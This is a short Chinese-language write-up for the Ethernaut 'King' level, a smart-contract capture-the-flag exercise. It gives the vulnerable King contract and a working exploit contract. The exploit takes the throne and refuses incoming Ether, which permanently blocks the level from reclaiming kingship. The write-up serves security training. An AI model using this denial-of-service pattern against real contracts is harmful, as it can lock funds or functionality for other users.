# Ethernaut CTF Writeup

## Level 9 King

> 題目: https://ethernaut.openzeppelin.com/level/0x473c8dF98DFd41304Bff2c5945B9f73e30f5c013

原始碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

```

過關條件: 

- 當你提交實例給關卡時，關卡會重新取回他的王位所有權，目標阻止合約重獲王位

解法：

- 自己布署一個合約來取得王位，該合約不要提供任何接收 Ether 的功能，關卡便無法取回王位

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    King target = King(payable(0x91417dead2e54085b444aDC065bfA50284868e3a));
    
    constructor() payable {
        address(target).call{value: target.prize()}("");
    }
}
```